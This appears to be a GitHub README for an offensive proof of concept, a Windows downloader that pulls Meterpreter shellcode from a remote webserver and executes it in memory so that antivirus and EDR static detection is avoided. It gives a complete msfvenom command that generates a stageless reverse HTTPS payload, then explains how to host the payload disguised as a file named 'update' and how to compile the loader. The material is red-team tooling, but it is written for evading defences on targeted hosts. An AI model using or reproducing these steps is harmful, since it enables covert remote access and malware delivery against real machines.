# Shellcode-Downloader-CreateThread-Execution
Also if you use for example **syscalls (nativ APIs)** to execute C2-shellcode with a .exe, you often have the problem, that 
your **compiled .exe** gets **statically flagged by the AV/EPP/EDR**. Many times the reason for this is, that the **C2-shellcode** 
has to be directly **included as string or as a .bin ressource** in the c++ POC and by that the well known C2-shellcode 
(e.g. Metasploit-, CobaltStrike-, Empire Shellcode etc.) is statically flagged by the AV/EPP/EDR. 
This means, no matter which clever technique you would use to bypass prevention/detection in context of API-Hooking, Kernel Callback Function etc. 
your .exe POC will get flagged before you can ever execute it. Also if you want to **compile a c++ POC** in Visual Studio it isn't possible to **include stageless shellcode** in a char string, because the string is **limited in length** (always stay stageless if possible 😉). 

From my experience, depending on the AV/EPP/EDR it isn't often the most important thing to only care about how to bypass the dynamically prevention/detection of an AV/EPP/EDR. At least equally important is to care about how could I bypass the statically prevetion/detection, to maybe break the chain of a maybe following connected dynamicall or in-memory prevention/detection. 

**This POC gives you the possibility to compile a .exe to completely avoid statically detection by AV/EPP/EDR of your C2-shellcode and download and execute your C2-shellcode which is hosted on your (C2)-webserver.**

![image](https://user-images.githubusercontent.com/50073731/160274700-173f342f-1fd8-4080-8e78-d832129a99c6.png)

By that POC we have the advantage, that the shellcode for the C2 reverse shell isn't included as string or as .bin file in the POC.
Trough that, we don't have the problem of statically detection of the C2 shellcode by an AV/EPP/EDR, because the complete C2-shellcode is hosted 
on a webserver. 



**1. Creating stageless shellcode with MSF-Venom**

**kali>** msfvenom -p windows/x64/meterpreter_reverse_https LHOST=10.10.0.1 LPORT=443 -f c --arch x64 --platform windows -o /tmp/meterx64.c

![image](https://user-images.githubusercontent.com/50073731/160274011-82fd0f13-a52c-4f90-93bd-01d39a9872d9.png)



**2. Hosting file with MSF-stageless shellcode on webserver**

Based on the code in the c++ POC the hosted shellcode must be in HEX-Format. To bring the whole MSF-shellcode in one line, you can use the
the line operation function in Notpad++ join lines and then remove not spaces and the double quotes in the string. Only at the beginning and the end
we need from the HEX-shellcode string we need double quotes.

![image](https://user-images.githubusercontent.com/50073731/160274172-4a793332-db0d-465f-b6e9-aa3cf024c8a3.png)

![image](https://user-images.githubusercontent.com/50073731/160843980-56d60e17-de71-4505-a847-4fa1d3f51032.png)

![image](https://user-images.githubusercontent.com/50073731/160844266-8a9b2e0c-1bcb-4122-97aa-6eca529e9d46.png)

At the end you can save the file with the stageless MSF-shellcode as a file without any filetype ending, we call it for example **update** and then upload the MSF-Shellcode File on your webserver of choice. 

**3. Change the link in the c++ POC to your MSF-payload**
In this step we change the link in the POC to the link of the webserver on which we have hosted our stageless MSF-Shellcode and compile
it in **Visual Studio as Release x64**.

![image](https://user-images.githubusercontent.com/50073731/160274705-7c608ab1-1137-4f0f-8152-8a722de6a270.png)

**After compiling with VS you have a x64 Binary, which do not contain any C2-shellcode string or .bin file at all. After execution 
the C2-shellcode is downloaded and executed in the memory of the targeted host.** 
At the moment the execution of the shellcode by using Create Thread is done with WIN32 APIs.
But despite not using syscalls, the POC will do a nice job 😉.
